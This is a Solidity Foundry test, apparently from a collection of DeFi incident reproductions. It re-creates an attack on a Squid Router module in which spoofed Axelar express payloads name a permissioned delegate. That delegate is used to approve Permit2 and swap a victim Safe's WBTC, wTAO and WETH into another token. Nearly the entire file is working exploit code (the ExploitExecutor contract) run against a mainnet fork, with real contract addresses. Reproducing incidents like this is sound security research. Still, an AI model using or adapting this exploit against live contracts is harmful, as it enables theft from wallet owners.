// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.25 WBTC + 0.29 wTAO + 0.02 WETH
// Attacker : 0x9bdc730183821b6bb2b51be30b77c964fa645b91
// Attack Contract : 0xe1d5fcfbba4d46f4937de369de415dd7e2d3265a
// Vulnerable Contract : 0x1f1d37a3bf840e35c6a860c7c2da71fe555123ca
// Attack Tx : https://etherscan.io/tx/0x2d52984706d5ac567d554d40a62beeeda9e3901dd3847e93dd2a3117902abfeb

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x1f1d37a3bf840e35c6a860c7c2da71fe555123ca#code

// @Analysis
// Source : https://t.me/defimon_alerts/3045
//
// The public Axelar express path accepts a caller-supplied payload and uses the delegate encoded in that payload
// for Safe permission checks. The attacker supplied a payload naming a delegate with wildcard permissions on the
// victim Safe, then used the module to approve Permit2 and swap the Safe's WBTC, wTAO, and WETH into u.

address constant SQUID_ROUTER_MODULE = 0x1f1d37a3Bf840e35c6a860c7C2dA71Fe555123ca;
address constant ATTACKER = 0x9BDC730183821b6bb2B51BE30B77C964FA645b91;
address constant ATTACK_CONTRACT = 0xe1d5FCfBba4d46F4937de369De415dD7E2D3265a;
address constant VICTIM_SAFE = 0xc52950d522034a558903CC409c8bbF1f4Decc62e;
address constant PERMISSIONED_DELEGATE = 0x352C6a9f59357457b83D97e33cE28B333a7a1F3c;
address constant UNIVERSAL_ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

address constant U_TOKEN = 0xe6Ff0FE017D09D690493deC0F0f55E8f9Cdc3512;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant WTAO = 0x77E06c9eCCf2E797fd462A92B6D7642EF85b0A44;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant WBTC_U_POOL = 0x52821a7B74A9388000fC846E1D4fb9C48afCbfE6;
address constant WTAO_U_POOL = 0x5065302Afc91306C2919342766661A0D01464360;
address constant WETH_U_POOL = 0x97Aca462462549E218bFb16CcfF403739cD5B688;

string constant SQUID_ROUTER_SOURCE = "0xce16F69375520ab01377ce7B88f5BA8C48F8D666";
string constant AXELAR_TOKEN_SYMBOL = "WETH";
uint24 constant POOL_FEE = 500;

enum ExecuteActionType {
    UNI_V2_SWAP_EXACT_IN,
    UNI_V2_SWAP_EXACT_OUT,
    UNI_V3_SWAP_EXACT_IN,
    UNI_V3_SWAP_EXACT_OUT,
    ERC20_APPROVE,
    PERMIT2_APPROVE,
    NATIVE_WRAP,
    NATIVE_UNWRAP
}

struct ExecuteAction {
    ExecuteActionType actionType;
    bytes encodedData;
}

struct ActionsExecutionParams {
    ExecuteAction[] actions;
    bool isStrict;
}

interface ISquidRouterModule {
    function expressExecuteWithToken(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload,
        string calldata symbol,
        uint256 amount
    ) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    ExploitExecutor private executor;

    function setUp() public {
        uint256 forkBlock = 25_170_474;
        vm.createSelectFork("mainnet", forkBlock);
        vm.roll(25_170_475);
        vm.warp(1_779_689_879);

        fundingToken = WBTC;
        multiAssetLog = true;
        attacker = VICTIM_SAFE;
        _addFundingToken(WBTC);
        _addFundingToken(WTAO);
        _addFundingToken(WETH_TOKEN);
        _addFundingToken(U_TOKEN);
        _addFundingToken(address(0));

        vm.label(SQUID_ROUTER_MODULE, "SquidRouterModule");
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM_SAFE, "Victim Safe");
        vm.label(PERMISSIONED_DELEGATE, "Permissioned Delegate");
        vm.label(UNIVERSAL_ROUTER, "Universal Router");
        vm.label(PERMIT2, "Permit2");
        vm.label(U_TOKEN, "u");
        vm.label(WBTC, "WBTC");
        vm.label(WTAO, "wTAO");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(WBTC_U_POOL, "WBTC-u pool");
        vm.label(WTAO_U_POOL, "wTAO-u pool");
        vm.label(WETH_U_POOL, "WETH-u pool");

        executor = new ExploitExecutor();
        vm.etch(ATTACK_CONTRACT, address(executor).code);
    }

    function testExploit() public balanceLog {
        uint256 safeWbtcBefore = IERC20(WBTC).balanceOf(VICTIM_SAFE);
        uint256 safeWtaoBefore = IERC20(WTAO).balanceOf(VICTIM_SAFE);
        uint256 safeWethBefore = IERC20(WETH_TOKEN).balanceOf(VICTIM_SAFE);
        uint256 safeNativeBefore = VICTIM_SAFE.balance;
        uint256 safeUBefore = IERC20(U_TOKEN).balanceOf(VICTIM_SAFE);

        uint256 poolWbtcBefore = IERC20(WBTC).balanceOf(WBTC_U_POOL);
        uint256 poolWtaoBefore = IERC20(WTAO).balanceOf(WTAO_U_POOL);
        uint256 poolWethBefore = IERC20(WETH_TOKEN).balanceOf(WETH_U_POOL);

        // step 1: spoof express bridge fulfillment payloads that name the permissioned delegate.
        vm.prank(ATTACKER, ATTACKER);
        ExploitExecutor(ATTACK_CONTRACT).attack();

        // step 2: the Safe's valuable balances were consumed by the routed swaps.
        assertEq(IERC20(WBTC).balanceOf(VICTIM_SAFE), 0);
        assertEq(IERC20(WTAO).balanceOf(VICTIM_SAFE), 0);
        assertEq(IERC20(WETH_TOKEN).balanceOf(VICTIM_SAFE), 0);
        assertEq(VICTIM_SAFE.balance, 0);

        // step 3: the three pools received the assets, and the Safe received u.
        assertEq(IERC20(WBTC).balanceOf(WBTC_U_POOL) - poolWbtcBefore, safeWbtcBefore);
        assertEq(IERC20(WTAO).balanceOf(WTAO_U_POOL) - poolWtaoBefore, safeWtaoBefore);
        assertEq(IERC20(WETH_TOKEN).balanceOf(WETH_U_POOL) - poolWethBefore, safeNativeBefore + safeWethBefore);
        assertGt(IERC20(U_TOKEN).balanceOf(VICTIM_SAFE), safeUBefore);
    }
}

contract ExploitExecutor {
    ISquidRouterModule private constant module = ISquidRouterModule(SQUID_ROUTER_MODULE);

    function attack() external {
        _express(_swapAllTokenActions(WBTC));
        _express(_swapAllTokenActions(WTAO));
        _express(_wrapAndSwapWethActions());
    }

    function _express(
        ActionsExecutionParams memory params
    ) private {
        bytes memory payload = abi.encode(SQUID_ROUTER_MODULE, VICTIM_SAFE, PERMISSIONED_DELEGATE, params);

        module.expressExecuteWithToken(bytes32(0), "", SQUID_ROUTER_SOURCE, payload, AXELAR_TOKEN_SYMBOL, 0);
    }

    function _swapAllTokenActions(
        address token
    ) private view returns (ActionsExecutionParams memory params) {
        uint256 amountIn = IERC20(token).balanceOf(VICTIM_SAFE);

        params.actions = new ExecuteAction[](3);
        params.actions[0] = _erc20Approve(token);
        params.actions[1] = _permit2Approve(token);
        params.actions[2] = _v3ExactInputSwap(token, amountIn);
        params.isStrict = false;
    }

    function _wrapAndSwapWethActions() private view returns (ActionsExecutionParams memory params) {
        uint256 nativeAmount = VICTIM_SAFE.balance;
        uint256 wethAmountIn = nativeAmount + IERC20(WETH_TOKEN).balanceOf(VICTIM_SAFE);

        params.actions = new ExecuteAction[](4);
        params.actions[0] =
            ExecuteAction({actionType: ExecuteActionType.NATIVE_WRAP, encodedData: abi.encode(nativeAmount)});
        params.actions[1] = _erc20Approve(WETH_TOKEN);
        params.actions[2] = _permit2Approve(WETH_TOKEN);
        params.actions[3] = _v3ExactInputSwap(WETH_TOKEN, wethAmountIn);
        params.isStrict = false;
    }

    function _erc20Approve(
        address token
    ) private pure returns (ExecuteAction memory) {
        return ExecuteAction({
            actionType: ExecuteActionType.ERC20_APPROVE, encodedData: abi.encode(token, PERMIT2, type(uint256).max)
        });
    }

    function _permit2Approve(
        address token
    ) private pure returns (ExecuteAction memory) {
        return ExecuteAction({
            actionType: ExecuteActionType.PERMIT2_APPROVE,
            encodedData: abi.encode(token, UNIVERSAL_ROUTER, type(uint160).max)
        });
    }

    function _v3ExactInputSwap(
        address tokenIn,
        uint256 amountIn
    ) private view returns (ExecuteAction memory) {
        return ExecuteAction({
            actionType: ExecuteActionType.UNI_V3_SWAP_EXACT_IN,
            encodedData: abi.encode(
                UNIVERSAL_ROUTER, amountIn, 0, block.timestamp + 1000, abi.encodePacked(tokenIn, POOL_FEE, U_TOKEN)
            )
        });
    }
}
